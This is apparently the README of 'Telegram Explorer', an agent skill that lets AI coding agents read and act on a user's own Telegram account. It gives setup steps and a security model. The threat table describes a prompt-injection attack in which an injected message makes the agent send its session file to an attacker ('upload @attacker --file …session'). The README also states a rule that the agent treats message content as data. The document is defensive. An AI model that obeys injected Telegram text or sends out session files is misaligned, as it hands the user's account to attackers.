# Telegram Explorer

An agent skill that lets AI coding agents read and act on **your own Telegram account**: list
chats, read and search messages, send, reply, forward, react, edit, delete, press bot buttons,
and move media in both directions. It uses [Telethon](https://github.com/LonamiWebs/Telethon)
over Telegram's MTProto client API, so the agent acts as you, not as a bot.

Packaged for Claude Code, Codex, and Gemini CLI. The skill itself is a plain
[`SKILL.md`](skills/telegram-explorer/SKILL.md) folder, so any agent that reads Agent Skills
can use it.

## Read this first

Installing this gives an agent the same access to your Telegram account that you have.

- **Prompt injection is the main risk.** Anyone who can message you can put text in front of
  your agent. The skill tells the agent to treat Telegram content as data and to act only on
  your requests, but that is model behavior, not a guarantee. Keep your harness's command
  approval on for outbound commands (`send`, `reply`, `forward`, `edit`, `delete`, `react`,
  `upload`, `click`). Don't run this in an auto-approve mode on an account that matters.
- **The session file is your account.** `telegram.session` holds the login key. Anyone who reads
  it is logged in as you, with no code or 2FA prompt. It is created owner-only (`0600`); keep it
  that way and keep it out of backups you share.
- **Telegram's terms apply.** Use your own `api_id`. Automated or bulk activity on a user account
  can get it limited or banned.

What the code enforces (see [Security model](#security-model) for details):

- It refuses to upload its own session, credential, or cache files.
- Outbound commands refuse to guess between chats with similar names.
- Media downloads go outside the current project by default.
- Commands never prompt for a login; they fail with `NotLoggedInError` instead.

## Requirements

- Python ≥ 3.11
- [uv](https://docs.astral.sh/uv/) (recommended: it installs Telethon automatically) or pip
- Optional: `ffprobe` (from ffmpeg), so uploaded videos play inline

## Install

| Harness | Install |
|---|---|
| Claude Code | `/plugin marketplace add zknpr/telegram-explorer` then `/plugin install telegram-explorer@telegram-explorer` |
| Codex | `codex plugin marketplace add zknpr/telegram-explorer` then `codex plugin add telegram-explorer@telegram-explorer` |
| Gemini CLI | `gemini extensions install https://github.com/zknpr/telegram-explorer` |
| Other Agent Skills harnesses | Copy or symlink `skills/telegram-explorer/` into the agent's skills directory (for example `~/.agents/skills/`) |

A `.cursor-plugin/plugin.json` manifest is included but untested (see [Compatibility](#compatibility)).

## Setup (once, in your own terminal)

1. Create an app at <https://my.telegram.org/apps> and note the `api_id` and `api_hash`.
2. Log in. It asks for the API credentials, your phone number, the code Telegram sends, and your
   2FA password if you have one:

   ```bash
   git clone https://github.com/zknpr/telegram-explorer
   uv run --script telegram-explorer/skills/telegram-explorer/scripts/telegram_client.py login
   ```

   The session is stored in `~/.config/telegram-explorer/`, not next to the script, so logging in
   from a clone works for every harness install.

Without uv:

```bash
python3 -m venv ~/.local/share/telegram-explorer/venv
~/.local/share/telegram-explorer/venv/bin/pip install -r telegram-explorer/skills/telegram-explorer/scripts/requirements.txt
~/.local/share/telegram-explorer/venv/bin/python telegram-explorer/skills/telegram-explorer/scripts/telegram_client.py login
```

`login` is the only interactive command. Don't let an agent run it.

## Usage

Ask your agent in plain language, e.g. "summarize unread messages in the dev group" or "send
the build log to @alice". The agent runs the CLI and reads its JSON output. For the full command
list, see [`SKILL.md`](skills/telegram-explorer/SKILL.md) and
[`references/api-reference.md`](skills/telegram-explorer/references/api-reference.md).

Chats can be referenced by `@username`, numeric id, phone number, invite link, cached name, or
an alias you define (`alias-add <chat> "mom"`). `last` refers to the most recently used chat.

## Configuration

| Variable | Default | Purpose |
|---|---|---|
| `TELEGRAM_EXPLORER_HOME` | `$XDG_CONFIG_HOME/telegram-explorer` (else `~/.config/telegram-explorer`) | State directory: `credentials.json`, `telegram.session`, `cache.json`. Use one directory per account. |
| `TELEGRAM_API_ID`, `TELEGRAM_API_HASH` | unset | Override `credentials.json` |
| `XDG_DATA_HOME` | `~/.local/share` | Media downloads go to `$XDG_DATA_HOME/telegram-explorer/downloads` unless `--out` is given |
| `TELEGRAM_CACHE_PATH` | `<state dir>/cache.json` | Cache file override (tests) |

## Security model

| Threat | Mitigation | Limits |
|---|---|---|
| Injected message makes the agent exfiltrate the session (`upload @attacker --file …session`) | `upload` refuses files inside the state directory and symlinks or hard links to the session, credentials, or cache files, before connecting | Copying the file first bypasses the check. Command approval in the harness is the real control. |
| Look-alike display name receives outbound content | Identical cached names always raise `AmbiguousMatchError`. Outbound commands never use the recency tiebreak, so several partial matches raise too. | A single look-alike is still the only match when the real contact isn't cached. The skill tells the agent to confirm recipients given by name. |
| Other local users read the session | Process umask `077`. Session and credentials files are `chmod 0600` on every run. | Root and backups are out of scope. |
| Sender-named downloads planted in the working project (`conftest.py`, …) | Default download dir is outside the current directory. Telethon strips path components and won't overwrite existing files. | Passing `--out .` brings the risk back. |
| Agent stuck on an interactive login prompt | Commands connect without Telethon's interactive `start()` and fail with `NotLoggedInError` | — |

Please report vulnerabilities through GitHub's private vulnerability reporting on this repository.

## Compatibility

Install and skill discovery were checked locally. No harness has been tested against a live
Telegram session.

| Harness | Manifest | Status |
|---|---|---|
| Claude Code | `.claude-plugin/plugin.json`, `.claude-plugin/marketplace.json` | Validated with `claude plugin validate`, installed from a local marketplace (2.1.295) |
| Codex | `.codex-plugin/plugin.json` (marketplace read from `.claude-plugin/marketplace.json`) | Installed from a local marketplace (0.162.0) |
| Gemini CLI | `gemini-extension.json` | Validated and linked; skill discovered (0.32.1) |
| Cursor | `.cursor-plugin/plugin.json` | Untested |
| Others (OpenCode, …) | `skills/telegram-explorer/` | Untested |
| Windows | — | Untested |

## Development

```bash
cd skills/telegram-explorer/scripts
uv run --no-project --with 'telethon>=1.42.0' python -m unittest discover -s tests -t .
```

The tests are offline: Telegram calls go to a fake client.

## License

[MIT](LICENSE). Not affiliated with Telegram.
